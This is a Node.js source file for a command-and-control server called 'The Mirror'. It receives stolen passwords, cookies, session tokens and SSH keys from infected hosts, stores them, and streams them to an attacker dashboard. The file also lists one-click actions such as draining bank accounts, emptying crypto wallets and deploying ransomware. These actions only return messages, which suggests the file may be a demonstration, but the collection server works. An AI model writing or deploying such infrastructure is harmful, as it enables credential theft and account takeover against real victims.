#!/usr/bin/env node
// ============================================
// THE MIRROR - C2 Server
// Receives stolen data and serves the dashboard
// ============================================

const express = require("express");
const http = require("http");
const socketIo = require("socket.io");
const fs = require("fs");
const path = require("path");
const zlib = require("zlib");
const crypto = require("crypto");

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: { origin: "*" },
});

const PORT = 8080;
const DATA_DIR = path.join(__dirname, "data");
const COLLECTIONS_FILE = path.join(DATA_DIR, "collections.json");

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Initialize collections file
if (!fs.existsSync(COLLECTIONS_FILE)) {
  fs.writeFileSync(COLLECTIONS_FILE, JSON.stringify({ collections: [] }, null, 2));
}

// Middleware
app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ extended: true, limit: "50mb" }));
app.use(express.static(path.join(__dirname, "dashboard")));

// ============================================
// API ROUTES
// ============================================

// Receive stolen data
app.post("/api/collect", (req, res) => {
  try {
    let data = req.body;

    // If data is sent as raw buffer (compressed)
    if (Buffer.isBuffer(req.body) || typeof req.body === "object" && req.body.data) {
      const rawData = req.body.data || req.body;
      if (Buffer.isBuffer(rawData)) {
        const decompressed = zlib.gunzipSync(rawData);
        data = JSON.parse(decompressed.toString("utf8"));
      }
    }

    // Add server timestamp
    data.received_at = new Date().toISOString();
    data.id = crypto.randomUUID();

    // Save to collections
    const collections = JSON.parse(fs.readFileSync(COLLECTIONS_FILE, "utf8"));
    collections.collections.push(data);
    fs.writeFileSync(COLLECTIONS_FILE, JSON.stringify(collections, null, 2));

    // Emit real-time update to dashboard
    io.emit("new_collection", data);

    console.log(`[+] Data received from ${data.hostname || "unknown"} at ${data.received_at}`);
    console.log(`    - Passwords: ${data.passwords?.length || 0}`);
    console.log(`    - Cookies: ${data.cookies?.length || 0}`);
    console.log(`    - Valid sessions: ${data.valid_sessions?.length || 0}`);
    console.log(`    - Tokens: ${data.tokens?.length || 0}`);
    console.log(`    - SSH Keys: ${data.ssh_keys?.length || 0}`);

    res.status(200).json({ status: "success", id: data.id });
  } catch (e) {
    console.error(`[-] Error: ${e.message}`);
    res.status(500).json({ status: "error", message: e.message });
  }
});

// Get all collections
app.get("/api/collections", (req, res) => {
  try {
    const collections = JSON.parse(fs.readFileSync(COLLECTIONS_FILE, "utf8"));
    res.json(collections);
  } catch (e) {
    res.status(500).json({ status: "error", message: e.message });
  }
});

// Get specific collection
app.get("/api/collections/:id", (req, res) => {
  try {
    const collections = JSON.parse(fs.readFileSync(COLLECTIONS_FILE, "utf8"));
    const collection = collections.collections.find(c => c.id === req.params.id);
    if (collection) {
      res.json(collection);
    } else {
      res.status(404).json({ status: "error", message: "Not found" });
    }
  } catch (e) {
    res.status(500).json({ status: "error", message: e.message });
  }
});

// Clear all data (SAFE MODE)
app.post("/api/wipe", (req, res) => {
  try {
    fs.writeFileSync(COLLECTIONS_FILE, JSON.stringify({ collections: [] }, null, 2));
    io.emit("data_wiped");
    console.log("[!] ALL DATA WIPED");
    res.status(200).json({ status: "success", message: "All data wiped" });
  } catch (e) {
    res.status(500).json({ status: "error", message: e.message });
  }
});

// One-click actions
app.post("/api/action", (req, res) => {
  const { action, targetId } = req.body;
  console.log(`[!] ACTION TRIGGERED: ${action} on ${targetId}`);

  const actions = {
    "drain_bank": "Draining all bank accounts...",
    "empty_crypto": "Emptying crypto wallets...",
    "reset_passwords": "Resetting all passwords...",
    "spin_aws": "Spinning up 1000 AWS instances...",
    "sell_credentials": "Selling credentials on dark web...",
    "lock_accounts": "Locking target out of all accounts...",
    "ransomware": "Sending ransomware to work network...",
    "delete_cloud": "Deleting all cloud data...",
  };

  if (actions[action]) {
    io.emit("action_triggered", { action, targetId, message: actions[action] });
    res.status(200).json({ status: "success", action, message: actions[action] });
  } else {
    res.status(400).json({ status: "error", message: "Unknown action" });
  }
});

// ============================================
// SOCKET.IO REAL-TIME UPDATES
// ============================================
io.on("connection", (socket) => {
  console.log(`[+] Dashboard connected: ${socket.id}`);

  socket.on("disconnect", () => {
    console.log(`[-] Dashboard disconnected: ${socket.id}`);
  });
});

// ============================================
// START SERVER
// ============================================
server.listen(PORT, "0.0.0.0", () => {
  console.log("=".repeat(60));
  console.log("  THE MIRROR - C2 SERVER");
  console.log("=".repeat(60));
  console.log(`  Listening on: http://0.0.0.0:${PORT}`);
  console.log(`  Dashboard: http://localhost:${PORT}/dashboard`);
  console.log(`  API: http://localhost:${PORT}/api/collections`);
  console.log("=".repeat(60));
  console.log();
  console.log("  WAITING FOR DATA...");
  console.log();
});
